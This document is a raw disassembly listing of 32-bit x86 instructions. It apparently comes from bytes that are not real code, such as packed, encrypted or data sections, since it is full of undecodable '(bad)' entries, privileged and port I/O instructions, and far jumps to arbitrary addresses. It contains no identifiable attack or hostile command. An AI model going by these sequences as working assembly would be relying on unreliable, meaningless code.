  41eebd:	jge    0x41ee5a
  41eebf:	push   edx
  41eec0:	mov    ebp,0x1def586b
  41eec5:	enter  0xb006,0xda
  41eec9:	mov    dh,0x81
  41eecb:	fldcw  WORD PTR [ebp-0x2d]
  41eece:	cld    
  41eecf:	fiadd  WORD PTR [edi-0x596c5b7b]
  41eed5:	jge    0x41eed5
  41eed7:	rol    dl,cl
  41eed9:	(bad)  
  41eeda:	push   edx
  41eedb:	scas   al,BYTE PTR es:[edi]
  41eedc:	iret   
  41eedd:	jo     0x41ef07
  41eedf:	loope  0x41ee9f
  41eee1:	mov    esi,DWORD PTR [ebx+0x16]
  41eee4:	loop   0x41ef12
  41eee6:	loop   0x41ef2b
  41eee8:	out    0x4e,eax
  41eeea:	iret   
  41eeeb:	jl     0x41ef32
  41eeed:	dec    edi
  41eeee:	mov    ds:0xf9b4d3fd,eax
  41eef3:	test   BYTE PTR [ecx+0x78],dh
  41eef6:	int    0x21
  41eef8:	cmp    al,0xdd
  41eefa:	inc    ebp
  41eefb:	shl    dl,cl
  41eefd:	mov    ch,ah
  41eeff:	rcr    DWORD PTR [ecx-0x52],1
  41ef02:	int3   
  41ef03:	iret   
  41ef04:	dec    ecx
  41ef05:	hlt    
  41ef06:	out    dx,al
  41ef07:	or     DWORD PTR [eax+eiz*8-0x6d],esp
  41ef0b:	popa   
  41ef0c:	xchg   BYTE PTR [ecx+0x4e],ch
  41ef0f:	loope  0x41eecd
  41ef11:	test   al,0xea
  41ef13:	pop    esi
  41ef14:	jmp    0x16da5bc6
  41ef19:	adc    BYTE PTR [eax+0x2e22570a],0xbc
  41ef20:	test   ch,0xba
  41ef23:	idiv   BYTE PTR [ebp-0xd929c7]
  41ef29:	loopne 0x41eeb7
  41ef2b:	ret    
  41ef2c:	out    dx,eax
  41ef2d:	inc    DWORD PTR [ecx+0x4b]
  41ef30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef31:	test   BYTE PTR [ecx-0x20d20079],ch
  41ef37:	arpl   si,bp
  41ef39:	mov    ds:0xca47edd4,al
  41ef3e:	mov    ecx,DWORD PTR [ebp+esi*2-0x15faa9a9]
  41ef45:	mov    WORD PTR [esp+esi*4+0x65],fs
  41ef49:	ja     0x41eed3
  41ef4b:	jmp    0x41efae
  41ef4d:	or     BYTE PTR [edi],dl
  41ef4f:	dec    esp
  41ef50:	or     esp,DWORD PTR [ebx]
  41ef52:	popf   
  41ef53:	push   0x624867e1
  41ef58:	or     eax,0x1cfe2280
  41ef5d:	cmp    al,0x1d
  41ef5f:	jmp    0xdc61d45
  41ef64:	outs   dx,DWORD PTR ds:[esi]
  41ef65:	mov    esp,0x99adfd1f
  41ef6a:	and    al,0xde
  41ef6c:	(bad)  [ebp+0x1de1d211]
  41ef72:	mov    dh,0x5d
  41ef74:	neg    DWORD PTR [edx+eiz*1+0xd]
  41ef78:	sub    bp,bp
  41ef7b:	cdq    
  41ef7c:	pop    ecx
  41ef7d:	ins    BYTE PTR es:[edi],dx
  41ef7e:	stos   BYTE PTR es:[edi],al
  41ef7f:	cld    
  41ef80:	aas    
  41ef81:	push   edi
  41ef82:	arpl   ax,ax
  41ef84:	shl    DWORD PTR [ebx+0x1bb22bf8],0x86
  41ef8b:	sbb    al,BYTE PTR [esi-0x7a]
  41ef8e:	mov    dh,0xcb
  41ef90:	jno    0x41efab
  41ef92:	mov    gs,WORD PTR [ebp-0x1ef1c02c]
  41ef98:	xchg   ebp,eax
  41ef99:	dec    ebp
  41ef9a:	dec    ecx
  41ef9b:	mov    ch,0xd8
  41ef9d:	stos   BYTE PTR es:[edi],al
  41ef9e:	scas   eax,DWORD PTR es:[edi]
  41ef9f:	xchg   edi,eax
  41efa0:	scas   al,BYTE PTR es:[edi]
  41efa1:	jne    0x41ef73
  41efa3:	jb     0x41ef98
  41efa5:	or     al,0x4a
  41efa7:	cmp    ebp,DWORD PTR [esi]
  41efa9:	push   ebx
  41efaa:	aaa    
  41efab:	xor    al,BYTE PTR [ecx-0x1]
  41efae:	fs inc eax
  41efb0:	cmp    BYTE PTR [ecx+0x20],dl
  41efb3:	cmp    al,ch
  41efb5:	mov    ds,WORD PTR [ebx-0x48]
  41efb8:	lahf   
  41efb9:	push   edx
  41efba:	push   ebp
  41efbb:	pop    ebx
  41efbc:	mov    esp,0x2134d1f
  41efc1:	test   edx,esp
  41efc3:	jbe    0x41f035
  41efc5:	inc    bx
  41efc7:	imul   edx,eax,0x47
  41efca:	icebp  
  41efcb:	bound  ecx,QWORD PTR [ecx-0x3ce2d195]
  41efd1:	inc    ebp
  41efd2:	jne    0x41f03c
  41efd4:	repnz or eax,0x73a0414a
  41efda:	ret    
  41efdb:	test   ecx,esp
  41efdd:	add    BYTE PTR [ebx+ebp*4-0x61536ea5],dl
  41efe4:	mov    ecx,0x9af0100b
  41efe9:	jb     0x41f001
  41efeb:	pusha  
  41efec:	sar    BYTE PTR [eax],1
  41efee:	jno    0x41ef72
  41eff0:	mov    ds:0xc47c52be,al
  41eff5:	or     al,BYTE PTR [esp+ebp*2]
  41eff8:	mov    dh,0x98
  41effa:	xchg   edx,esp
  41effc:	jmp    DWORD PTR [edx]
  41effe:	leave  
  41efff:	cli    
  41f000:	push   es
  41f001:	sub    edx,edi
  41f003:	retf   
  41f004:	inc    edi
  41f005:	xchg   esp,eax
  41f006:	mov    dh,0x57
  41f008:	gs inc esp
  41f00a:	sahf   
  41f00b:	es pushf 
  41f00d:	or     ah,BYTE PTR [edi+esi*4-0x168f9a14]
  41f014:	sbb    DWORD PTR fs:[bp+di-0x1ed4],edi
  41f01a:	retf   0xf011
  41f01d:	and    DWORD PTR [esp+esi*2+0x29daf93b],edx
  41f024:	ins    BYTE PTR es:[edi],dx
  41f025:	or     DWORD PTR ds:0x7eb86820,edi
  41f02b:	jns    0x41effe
  41f02d:	test   eax,0xcd57f2c1
  41f032:	fcom   DWORD PTR [ecx-0x4a0733bf]
  41f038:	pushf  
  41f039:	sbb    eax,0xb64fbb1c
  41f03e:	dec    edx
  41f03f:	std    
  41f040:	mov    cl,0x1e
  41f042:	jl     0x41efc8
  41f044:	daa    
  41f045:	pushf  
  41f046:	adc    al,0x70
  41f048:	jb     0x41f042
  41f04a:	push   esi
  41f04b:	ret    0xbddd
  41f04e:	shl    DWORD PTR [edx+0x5ae021d2],0xc
  41f055:	sbb    bh,BYTE PTR [esi+ebx*4]
  41f058:	ror    BYTE PTR [ebx+0xf],0xe8
  41f05c:	lods   eax,DWORD PTR ds:[esi]
  41f05d:	add    BYTE PTR [ecx-0x60],cl
  41f060:	jl     0x41f03e
  41f062:	lea    edi,[ebp-0x23e8b345]
  41f068:	loop   0x41f0e1
  41f06a:	aaa    
  41f06b:	add    eax,0x47dcc36b
  41f070:	sub    eax,0xa6e52f53
  41f075:	jae    0x41f009
  41f077:	adc    BYTE PTR [edi+esi*8+0x383d78a5],bl
  41f07e:	cmp    eax,0x75692c2c
  41f083:	and    DWORD PTR [edi],ebp
  41f085:	rol    al,cl
  41f087:	cmp    al,0xa2
  41f089:	sub    eax,0xb6377054
  41f08e:	fsub   DWORD PTR ds:0x3878f968
  41f094:	push   ebp
  41f095:	cmp    ebx,ecx
  41f097:	xor    ecx,DWORD PTR [eax-0x70]
  41f09a:	or     ebx,esi
  41f09c:	test   al,0x4c
  41f09e:	out    dx,al
  41f09f:	jg     0x41f0d0
  41f0a1:	pop    ecx
  41f0a2:	repz inc esp
  41f0a4:	loope  0x41f068
  41f0a6:	call   FWORD PTR [ecx+0x3aa94f49]
  41f0ac:	inc    esp
  41f0ad:	mov    bl,0xf4
  41f0af:	stos   DWORD PTR es:[edi],eax
  41f0b0:	mov    ebx,0x305b4b92
  41f0b5:	mov    ebp,0xc4deb1ea
  41f0ba:	rcl    DWORD PTR [ecx],cl
  41f0bc:	in     eax,0xa8
  41f0be:	rol    BYTE PTR [eax],0x8f
  41f0c1:	loopne 0x41f0f7
  41f0c3:	cmp    ecx,ebx
  41f0c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0c6:	mov    dl,0xa
  41f0c8:	pop    ss
  41f0c9:	mov    dl,0xeb
  41f0cb:	mov    cl,0x53
  41f0cd:	lahf   
  41f0ce:	mov    ebp,0x5a6e9b26
  41f0d3:	outs   dx,BYTE PTR ds:[esi]
  41f0d4:	cli    
  41f0d5:	scas   al,BYTE PTR es:[edi]
  41f0d6:	bound  ebp,QWORD PTR [ecx+ebx*8]
  41f0d9:	xor    eax,esp
  41f0db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0dc:	jno    0x41f07d
  41f0de:	push   esi
  41f0df:	ficomp WORD PTR [edi+0x6a]
  41f0e2:	inc    esp
  41f0e3:	jmp    0xa49c:0xdc10f4f6
  41f0ea:	imul   esp,DWORD PTR [esi],0xffffffb3
  41f0ed:	and    ecx,DWORD PTR [eax+0x4a9ad87c]
  41f0f3:	add    al,0x3a
  41f0f5:	xor    ecx,edx
  41f0f7:	aad    0xa1
  41f0f9:	loop   0x41f153
  41f0fb:	mov    esi,0x5352d16d
  41f100:	addr16 in al,0xf3
  41f103:	cmp    al,0x56
  41f105:	jge    0x41f166
  41f107:	xchg   ecx,eax
  41f108:	and    al,0xa3
  41f10a:	jbe    0x41f151
  41f10c:	fimul  WORD PTR [eax+ecx*8-0x1e]
  41f110:	sub    esi,DWORD PTR [eax]
  41f112:	xlat   BYTE PTR ds:[ebx]
  41f113:	adc    BYTE PTR [edi],al
  41f115:	xor    eax,0x251aeba8
  41f11a:	jl     0x41f124
  41f11c:	ret    
  41f11d:	xor    al,0xb1
  41f11f:	es inc edx
  41f121:	ja     0x41f15d
  41f123:	in     eax,dx
  41f124:	dec    ebp
  41f125:	xchg   esp,eax
  41f126:	mov    ah,0x37
  41f128:	jl     0x41f112
  41f12a:	jp     0x41f0be
  41f12c:	repz dec eax
  41f12e:	push   ds
  41f12f:	pop    edx
  41f130:	cwde   
  41f131:	adc    esi,DWORD PTR [ebx]
  41f133:	push   ss
  41f134:	xor    DWORD PTR [ebx+0x4140d17c],0xffffffb0
  41f13b:	inc    edx
  41f13c:	mov    bl,0xa7
  41f13e:	lods   eax,DWORD PTR ds:[esi]
  41f13f:	retf   
  41f140:	test   esi,0xfbc3a580
  41f146:	das    
  41f147:	dec    ecx
  41f148:	mov    DWORD PTR [edi],ecx
  41f14a:	rol    edx,cl
  41f14c:	mov    gs,WORD PTR [edi+ecx*8-0x5a1232e9]
  41f153:	outs   dx,DWORD PTR ds:[esi]
  41f154:	fs retf 0x9330
  41f158:	or     al,0xb5
  41f15a:	lahf   
  41f15b:	cli    
  41f15c:	in     al,dx
  41f15d:	les    esi,FWORD PTR [ebx-0x3e]
  41f160:	inc    esi
  41f161:	or     edx,eax
  41f163:	xor    DWORD PTR [ecx+0x70],edx
  41f166:	cs mov eax,0x4c2e1c35
  41f16c:	pop    ebp
  41f16d:	jmp    0x41f1af
  41f16f:	xchg   esp,eax
  41f170:	repnz push ebp
  41f172:	jmp    0xb9d7eedc
  41f177:	inc    esp
  41f178:	jmp    0x41f13c
  41f17a:	and    edi,DWORD PTR [eax]
  41f17c:	ror    DWORD PTR [esi+0x62],cl
  41f17f:	shl    DWORD PTR [eax-0x47b03158],cl
  41f185:	sbb    esi,edi
  41f187:	enter  0xfcc5,0xcf
  41f18b:	xchg   ecx,eax
  41f18c:	xor    bl,dh
  41f18e:	jne    0x41f166
  41f190:	jmp    0x41f14a
  41f192:	mov    ds:0x2401e371,eax
  41f197:	mov    al,0xbb
  41f199:	mov    bh,BYTE PTR [ebx-0x3d]
  41f19c:	jne    0x41f163
  41f19e:	pop    ss
  41f19f:	push   ecx
  41f1a0:	adc    cl,ch
  41f1a2:	mov    bl,0xc0
  41f1a4:	test   DWORD PTR [eax-0x7835fc5e],edi
  41f1aa:	ror    BYTE PTR [ecx+0x2f],cl
  41f1ad:	jecxz  0x41f16c
  41f1af:	in     eax,dx
  41f1b0:	repnz mov WORD PTR [ebp-0x157829a6],?
  41f1b7:	jmp    0x49a7:0x2675b04e
  41f1be:	sub    bl,dl
  41f1c0:	jbe    0x41f1ad
  41f1c2:	leave  
  41f1c3:	jns    0x41f17d
  41f1c5:	pushf  
  41f1c6:	fimul  WORD PTR [eax+0x42c586ad]
  41f1cc:	cmc    
  41f1cd:	mov    ch,0x70
  41f1cf:	add    dh,bl
  41f1d1:	pop    eax
  41f1d2:	rcr    DWORD PTR [ebx+0x16d54c0a],cl
  41f1d8:	push   0x24
  41f1da:	jae    0x41f1a3
  41f1dc:	aam    0x46
  41f1de:	dec    DWORD PTR [ecx+edi*8]
  41f1e1:	data16 or al,0x21
  41f1e4:	sub    eax,DWORD PTR [ebx-0xfaa7de1]
  41f1ea:	jmp    0x2c01d5e8
  41f1ef:	stos   BYTE PTR es:[edi],al
  41f1f0:	jmp    0x4884:0xcce4d72b
  41f1f7:	adc    ebx,DWORD PTR [ecx]
  41f1f9:	sbb    edx,DWORD PTR [esp+eax*1-0x5adb20f2]
  41f200:	scas   ax,WORD PTR es:[edi]
  41f202:	mov    eax,0xf7dc488e
  41f207:	sub    BYTE PTR [ebx+eiz*2-0x6ae33bee],0xb4
  41f20f:	in     eax,0xa6
  41f211:	xor    eax,0x2b2cced8
  41f216:	inc    esp
  41f217:	out    0xb4,eax
  41f219:	pop    ecx
  41f21a:	push   0x1c139d3a
  41f21f:	push   edi
  41f220:	jmp    0x8e5de1e
  41f225:	out    dx,eax
  41f226:	xchg   esi,eax
  41f227:	stc    
  41f228:	(bad)  
  41f229:	daa    
  41f22a:	out    0xf1,al
  41f22c:	ficomp DWORD PTR [ebp-0x5b1476f3]
  41f232:	retf   0x3dbe
  41f235:	jmp    0xca1fd6eb
  41f23a:	xchg   esi,eax
  41f23b:	cmp    al,0xda
  41f23d:	mov    esp,0x204ba117
  41f242:	mov    al,BYTE PTR [eax+eiz*1-0x6d0aadbb]
  41f249:	adc    ch,dl
  41f24b:	sbb    eax,0x270f4453
  41f250:	fwait
  41f251:	inc    esi
  41f252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f253:	clc    
  41f254:	add    edx,ecx
  41f256:	jmp    0x3431:0xf855a4f8
  41f25d:	or     al,0xaf
  41f25f:	gs pop es
  41f261:	lock les ecx,FWORD PTR [eax+0x2474c74a]
  41f268:	test   esi,esp
  41f26a:	xchg   DWORD PTR [esi],esi
  41f26c:	add    esp,DWORD PTR [ebx]
  41f26e:	or     bl,bl
  41f270:	adc    BYTE PTR [esi+0x5aee8e3d],ah
  41f276:	stos   BYTE PTR es:[edi],al
  41f277:	retf   0xbf32
  41f27a:	in     eax,dx
  41f27b:	jg     0x41f2c6
  41f27d:	dec    esi
  41f27e:	cwde   
  41f27f:	test   al,0x5f
  41f281:	push   ds
  41f282:	lods   al,BYTE PTR ds:[esi]
  41f283:	aas    
  41f284:	and    DWORD PTR [ecx],esi
  41f286:	pushf  
  41f287:	sbb    esi,ebp
  41f289:	fiadd  DWORD PTR [edx]
  41f28b:	dec    eax
  41f28c:	je     0x41f214
  41f28e:	push   ecx
  41f28f:	xor    eax,0xeb3be078
  41f294:	test   DWORD PTR [ebx+0x49],ebp
  41f297:	nop
  41f298:	push   esp
  41f299:	mov    ecx,0x2f1061da
  41f29e:	pop    eax
  41f29f:	in     al,dx
  41f2a0:	push   ss
  41f2a1:	test   eax,eax
  41f2a3:	sub    al,0xaa
  41f2a5:	inc    esi
  41f2a6:	xchg   esi,eax
  41f2a7:	sub    al,0xc5
  41f2a9:	repnz adc eax,0x5d6976eb
  41f2af:	add    ah,BYTE PTR [edi+0x12]
  41f2b2:	test   BYTE PTR [esp+eax*2-0x15],al
  41f2b6:	mov    ds:0x6eae9e08,al
  41f2bb:	aas    
  41f2bc:	mov    dl,0xf3
  41f2be:	mov    esp,0x55a4ba24
  41f2c3:	mov    bl,dh
  41f2c5:	sti    
  41f2c6:	int3   
  41f2c7:	and    BYTE PTR [eax+0x1413a754],0xe1
  41f2ce:	and    ah,ch
  41f2d0:	cwde   
  41f2d1:	sub    DWORD PTR [ecx-0xdb58020],esp
  41f2d7:	test   eax,0xfe746b05
  41f2dc:	lods   eax,DWORD PTR ds:[esi]
  41f2dd:	mov    bh,0x79
  41f2df:	dec    DWORD PTR [eax]
  41f2e1:	adc    al,0x4c
  41f2e3:	pop    edx
  41f2e4:	dec    esi
  41f2e5:	push   ebp
  41f2e6:	hlt    
  41f2e7:	xor    esi,eax
  41f2e9:	or     ebx,DWORD PTR [eax]
  41f2eb:	(bad)  
  41f2ec:	cmp    eax,0xc267e37
  41f2f1:	sbb    al,0x37
  41f2f3:	aas    
  41f2f4:	data16 aaa 
  41f2f6:	sub    al,0x8d
  41f2f8:	out    dx,al
  41f2f9:	shr    BYTE PTR [edx+0x41eee897],1
  41f2ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f300:	pop    edi
  41f301:	mov    dh,0xfc
  41f303:	xchg   BYTE PTR [edx-0xe],al
  41f306:	xchg   esp,eax
  41f307:	imul   ebx,edi,0x2d
  41f30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f30b:	push   ss
  41f30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f30d:	lods   al,BYTE PTR ds:[esi]
  41f30e:	test   DWORD PTR [eax+0x51],ebx
  41f311:	sar    DWORD PTR [eax],0xb9
  41f314:	xchg   edx,eax
  41f315:	jle    0x41f2f6
  41f317:	rcr    BYTE PTR [edi-0x67],1
  41f31a:	add    eax,0xdd196777
  41f31f:	dec    edx
  41f320:	fs aas 
  41f322:	loopne 0x41f2d0
  41f324:	mov    edx,0x526914ce
  41f329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f32a:	mov    edx,0x128b6faa
  41f32f:	out    0xa5,al
  41f331:	loop   0x41f38e
  41f333:	and    al,0x76
  41f335:	xchg   esi,eax
  41f336:	sub    ecx,DWORD PTR [edx-0x4c]
  41f339:	fs xchg edi,eax
  41f33b:	in     eax,0xbb
  41f33d:	dec    ebx
  41f33e:	jne    0x41f2e3
  41f340:	dec    eax
  41f341:	mov    cl,0x17
  41f343:	jge    0x41f321
  41f345:	aas    
  41f346:	add    edx,DWORD PTR [edx+0x5d66fb04]
  41f34c:	add    DWORD PTR [ecx-0x1f64e6c],ebx
  41f352:	ret    0xa3c
  41f355:	dec    edi
  41f356:	xchg   BYTE PTR [ebx+edi*8+0x5e],dh
  41f35a:	add    BYTE PTR [ebp-0x7],0x85
  41f35e:	outs   dx,BYTE PTR ds:[esi]
  41f35f:	dec    eax
  41f360:	int3   
  41f361:	popf   
  41f362:	xchg   ebp,eax
  41f363:	or     DWORD PTR [edi+0x3567ee8b],edi
  41f369:	sub    DWORD PTR [ecx+0x787ea9f2],ecx
  41f36f:	inc    edi
  41f370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f371:	test   eax,0x3696795
  41f376:	int3   
  41f377:	push   ebx
  41f378:	jmp    0x41f303
  41f37a:	jne    0x41f326
  41f37c:	stos   DWORD PTR es:[edi],eax
  41f37d:	and    edx,DWORD PTR [eax-0x5141c698]
  41f383:	retf   0xefb3
  41f386:	cwde   
  41f387:	xchg   ebp,eax
  41f388:	rcr    ah,0xae
  41f38b:	sbb    edi,DWORD PTR [ebp-0x51]
  41f38e:	jnp    0x41f365
  41f390:	clc    
  41f391:	popa   
  41f392:	adc    bl,dl
  41f394:	xchg   edx,eax
  41f395:	push   edi
  41f396:	fucompp 
  41f398:	imul   edi,DWORD PTR [edi+0x14],0x2f
  41f39c:	cdq    
  41f39d:	pop    edx
  41f39e:	icebp  
  41f39f:	scas   al,BYTE PTR es:[edi]
  41f3a0:	into   
  41f3a1:	adc    ah,BYTE PTR [esi+0x1c6b96b3]
  41f3a7:	mov    al,ds:0xec4b1f03
  41f3ac:	loopne 0x41f378
  41f3ae:	and    esi,edi
  41f3b0:	lahf   
  41f3b1:	dec    esp
  41f3b2:	sbb    eax,0xe8b4a18
  41f3b7:	mov    dl,0x30
  41f3b9:	outs   dx,DWORD PTR ds:[esi]
  41f3ba:	hlt    
  41f3bb:	je     0x41f3d3
  41f3bd:	fucomi st,st(5)
  41f3bf:	sbb    DWORD PTR [esi+0x5],ecx
  41f3c2:	leave  
  41f3c3:	mov    ds,WORD PTR [ecx-0x22]
  41f3c6:	iret   
  41f3c7:	or     al,0x49
  41f3c9:	pop    edi
  41f3ca:	out    0xe2,eax
  41f3cc:	fcmovb st,st(7)
  41f3ce:	fnstcw WORD PTR [ebx]
  41f3d0:	mov    fs,esp
  41f3d2:	shl    DWORD PTR [edx],cl
  41f3d4:	mov    bh,0x30
  41f3d6:	iret   
  41f3d7:	(bad)  
  41f3d8:	mov    ebx,0x1c6ca9b3
  41f3dd:	jl     0x41f429
  41f3df:	mov    edi,DWORD PTR [ecx]
  41f3e1:	dec    edx
  41f3e2:	jge    0x41f430
  41f3e4:	sub    BYTE PTR [esi+0x38],bh
  41f3e7:	add    cl,BYTE PTR [ecx+0x3609441a]
  41f3ed:	leave  
  41f3ee:	pop    ebp
  41f3ef:	adc    eax,0xe8b076a8
  41f3f4:	es stos DWORD PTR es:[edi],eax
  41f3f6:	and    bl,BYTE PTR [ebp-0xf0c203f]
  41f3fc:	dec    ecx
  41f3fd:	xor    ecx,DWORD PTR [ebx]
  41f3ff:	mov    dl,0x30
  41f401:	sbb    eax,0x9c2fabd1
  41f406:	jmp    0x75ae:0x54e4c1e9
  41f40d:	xor    BYTE PTR [esi],bl
  41f40f:	pop    ds
  41f410:	sub    DWORD PTR ds:0xd9768a2c,edi
  41f416:	(bad)  
  41f417:	ffree  st(0)
  41f419:	push   0x13
  41f41b:	inc    esp
  41f41c:	ficom  DWORD PTR ds:0x8331eec9
  41f422:	das    
  41f423:	xchg   esi,eax
  41f424:	mov    bh,0x46
  41f426:	push   cs
  41f427:	or     BYTE PTR [esi+ebp*4],ah
  41f42a:	imul   ebx,DWORD PTR [esi],0xc4bfd09d
  41f430:	mov    bl,0x5e
  41f432:	sub    DWORD PTR [ebx],0xa
  41f435:	loop   0x41f426
  41f437:	call   0x9dbe:0x7a27c0f7
  41f43e:	mov    edx,0xd0443d14
  41f443:	adc    BYTE PTR [eax],al
  41f445:	jecxz  0x41f436
  41f447:	pushf  
  41f448:	mov    al,0x7e
  41f44a:	mov    dh,0xa1
  41f44c:	repz mov gs,edi
  41f44f:	xchg   esp,eax
  41f450:	mov    eax,DWORD PTR [ebx+0x1cd8b208]
  41f456:	mov    ds:0x8eb97e7d,al
  41f45b:	adc    BYTE PTR [esi-0x459482ab],dl
  41f461:	fs jo  0x41f40e
  41f464:	sbb    DWORD PTR [eax+0x19],esp
  41f467:	inc    edi
  41f468:	push   ebp
  41f469:	xchg   edi,eax
  41f46a:	test   al,0xba
  41f46c:	mov    cr2,ebx
  41f46f:	int3   
  41f470:	add    ecx,DWORD PTR ds:0xa7aa5d79
  41f476:	jmp    FWORD PTR [eax]
  41f478:	xor    eax,0x28c8d40b
  41f47d:	cld    
  41f47e:	xor    ch,BYTE PTR [edi]
  41f480:	xor    BYTE PTR [ebp-0x68],bl
  41f483:	(bad)
  41f486:	cmc    
  41f487:	data16 aam 0x4e
  41f48a:	mov    ds:0x852a8d74,al
  41f48f:	sub    al,0x10
  41f491:	adc    ch,BYTE PTR [eax+0x3]
  41f494:	addr16 daa 
  41f496:	add    BYTE PTR [eax+0x1504a977],bh
  41f49c:	mov    dh,0x7c
  41f49e:	into   
  41f49f:	xchg   DWORD PTR [edx+ecx*1-0x7dd68e68],ebp
  41f4a6:	jle    0x41f480
  41f4a8:	sub    al,0xd2
  41f4aa:	je     0x41f4dd
  41f4ac:	xor    ah,BYTE PTR [ecx+0x47]
  41f4af:	in     eax,0xdc
  41f4b1:	gs push esp
  41f4b3:	push   esp
  41f4b4:	xor    BYTE PTR [ecx-0x4192497],bl
  41f4ba:	clc    
  41f4bb:	sub    eax,0x8c01394f
  41f4c0:	or     bh,BYTE PTR [edi-0x444f815]
  41f4c6:	ins    DWORD PTR es:[edi],dx
  41f4c7:	outs   dx,DWORD PTR fs:[esi]
  41f4c9:	sbb    al,0x59
  41f4cb:	ret    0x782
  41f4ce:	repnz int3 
  41f4d0:	fdivr  DWORD PTR [esi+0x7a]
  41f4d3:	popf   
  41f4d4:	pop    eax
  41f4d5:	inc    ebp
  41f4d6:	fcmovb st,st(6)
  41f4d8:	dec    eax
  41f4d9:	push   esp
  41f4da:	(bad)  
  41f4db:	sbb    ah,cl
  41f4dd:	call   DWORD PTR [edi]
  41f4df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4e0:	jnp    0x41f46f
  41f4e2:	rcl    BYTE PTR [ecx],cl
  41f4e4:	jg     0x41f489
  41f4e6:	push   ecx
  41f4e7:	dec    eax
  41f4e8:	rcl    ebx,cl
  41f4ea:	inc    ebx
  41f4eb:	inc    edx
  41f4ec:	pop    es
  41f4ed:	mov    bl,0xb6
  41f4ef:	mov    ds:0x4605ac68,al
  41f4f4:	in     eax,dx
  41f4f5:	jge    0x41f566
  41f4f7:	mov    cl,0xe1
  41f4f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4fa:	jno    0x41f4c3
  41f4fc:	sbb    BYTE PTR [edi-0xb],dh
  41f4ff:	push   esi
  41f500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f501:	adc    eax,DWORD PTR [ebx-0x3c16a77b]
  41f507:	sbb    ebp,ebx
  41f509:	sbb    bl,BYTE PTR [edx]
  41f50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f50c:	xchg   edi,eax
  41f50d:	or     DWORD PTR [edi+0x56472add],esp
  41f513:	jge    0x41f4f1
  41f515:	inc    ebx
  41f516:	stc    
  41f517:	aaa    
  41f518:	enter  0x969a,0x5a
  41f51c:	jae    0x41f575
  41f51e:	sub    BYTE PTR [ecx+ebp*2-0x2cf411a5],0xf1
  41f526:	shr    DWORD PTR [esi+0x5deb6bf8],cl
  41f52c:	push   ecx
  41f52d:	inc    edx
  41f52e:	arpl   cx,si
  41f530:	scas   al,BYTE PTR es:[edi]
  41f531:	sar    eax,1
  41f533:	add    edi,edi
  41f535:	int    0xa5
  41f537:	pop    eax
  41f538:	xor    ebx,ecx
  41f53a:	jnp    0x41f4f4
  41f53c:	pushf  
  41f53d:	dec    esi
  41f53e:	cmp    DWORD PTR [esi-0x68],ecx
  41f541:	lock loope 0x41f532
  41f544:	(bad)  
  41f545:	in     al,0xbc
  41f547:	pop    ds
  41f548:	mov    ebx,0xf8dd949f
  41f54d:	and    BYTE PTR [edi],0xe8
  41f550:	inc    ebx
  41f551:	dec    bl
  41f553:	mov    bl,0x32
  41f555:	adc    DWORD PTR [ecx],eax
  41f557:	pop    ss
  41f558:	ret    0x2073
  41f55b:	jecxz  0x41f5a7
  41f55d:	ins    BYTE PTR es:[edi],dx
  41f55e:	mov    edx,0x89eb1496
  41f563:	push   ebp
  41f564:	jne    0x41f5c2
  41f566:	fisttp DWORD PTR cs:[eax]
  41f569:	(bad)  
  41f56a:	test   eax,0xaf508a86
  41f56f:	adc    ecx,DWORD PTR [esi+0x27]
  41f572:	add    BYTE PTR [ebp*4+0x16c12442],ah
  41f579:	jp     0x41f510
  41f57b:	and    eax,0x1ebff22b
  41f580:	mov    dl,0xf
  41f582:	sub    al,0x74
  41f584:	mov    ebx,0x27cc986c
  41f589:	jecxz  0x41f533
  41f58b:	outs   dx,DWORD PTR ds:[esi]
  41f58c:	ficom  DWORD PTR [eax-0x24]
  41f58f:	push   esp
  41f590:	pop    eax
  41f591:	ret    0xba97
  41f594:	arpl   ax,si
  41f596:	and    dl,BYTE PTR ds:0xd2a63b0e
  41f59c:	sub    al,0x59
  41f59e:	and    BYTE PTR [edx-0x1185a4d9],al
  41f5a4:	mov    ds:0x39d75f71,al
  41f5a9:	outs   dx,BYTE PTR ds:[esi]
  41f5aa:	sub    al,BYTE PTR [ecx-0x7ea30d90]
  41f5b0:	sbb    ch,BYTE PTR [edx-0x3f922cfd]
  41f5b6:	pop    ebp
  41f5b7:	pushf  
  41f5b8:	(bad)  
  41f5b9:	in     eax,0x5f
  41f5bb:	ja     0x41f5b1
  41f5bd:	push   0xd7fd400
  41f5c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5c3:	inc    ecx
  41f5c4:	mov    ebx,ecx
  41f5c6:	jns    0x41f5d2
  41f5c8:	mov    eax,ds:0xb5d4319c
  41f5cd:	enter  0xfd5f,0x36
  41f5d1:	pop    ss
  41f5d2:	loop   0x41f62b
  41f5d4:	retf   0x3765
  41f5d7:	inc    esi
  41f5d8:	int    0xf3
  41f5da:	ss pop ebx
  41f5dc:	xchg   ch,cl
  41f5de:	aas    
  41f5df:	xchg   edx,eax
  41f5e0:	out    dx,eax
  41f5e1:	sub    al,0x3e
  41f5e3:	push   edx
  41f5e4:	sub    bh,BYTE PTR [ebp+0x44f85294]
  41f5ea:	xlat   BYTE PTR ds:[ebx]
  41f5eb:	mov    DWORD PTR [ecx-0x17],edx
  41f5ee:	jge    0x41f609
  41f5f0:	bnd jge 0x41f597
  41f5f3:	and    BYTE PTR [esi],dh
  41f5f5:	iret   
  41f5f6:	pop    ecx
  41f5f7:	(bad)  [edx+0x44]
  41f5fa:	adc    DWORD PTR [edi-0x6d],esp
  41f5fd:	lahf   
  41f5fe:	test   eax,0xaa723639
  41f603:	xchg   ebp,eax
  41f604:	or     ah,BYTE PTR [esi]
  41f606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f607:	fs mov ecx,0x57a4a49b
  41f60d:	mov    al,0x48
